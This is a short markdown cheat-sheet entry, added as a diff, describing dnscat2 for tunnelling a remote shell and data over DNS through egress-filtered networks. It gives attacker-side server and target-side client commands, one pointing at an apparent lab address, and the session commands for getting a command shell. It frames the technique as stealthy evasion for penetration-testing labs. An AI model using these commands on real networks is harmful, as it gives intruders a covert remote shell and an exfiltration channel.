@@ -1,0 +1,20 @@
+---
+title: "dnscat2"
+---
+
+Tunnels a shell / data over **DNS** — for egress-filtered networks where only DNS resolves out. Server on your box, client on the target.
+
+```bash
+# server (attacker) — needs a domain delegated to you, or direct mode
+dnscat2-server inlanefreight.local
+# client (target)
+./dnscat --secret=<secret> inlanefreight.local        # via DNS hierarchy
+./dnscat --dns server=10.10.14.18,port=53 --secret=<secret>   # direct
+```
+
+```text
+dnscat2> windows            # list sessions
+dnscat2> window -i 1        # interact with a session (command shell)
+```
+
+<Tip>Slow but stealthy — reach for it only when TCP/HTTP egress is blocked but DNS lookups leave the network.</Tip>
